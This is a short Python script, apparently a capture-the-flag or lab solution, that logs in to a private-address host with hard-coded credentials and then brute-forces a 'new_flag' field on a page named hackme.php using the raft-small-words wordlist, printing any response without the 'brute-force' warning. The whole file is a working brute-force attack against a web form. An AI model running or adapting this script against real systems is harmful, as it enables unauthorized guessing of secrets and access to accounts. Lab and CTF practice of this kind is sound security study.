import requests
lines = []

with open("raft-small-words.txt", "r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
    'login_field': 'cgi-bin',
    'cred_field': 'ebay'
}

response = s.post('http://172.25.0.32/check.php', data=credentials)

for i in lines:
    mydata = {'new_flag':i.replace("\n","")}
    response2 = s.post('http://172.25.0.32/hackme.php', data=mydata)
    currentPageText = response2.text

    if "brute-force" not in currentPageText:
        print(response2.text)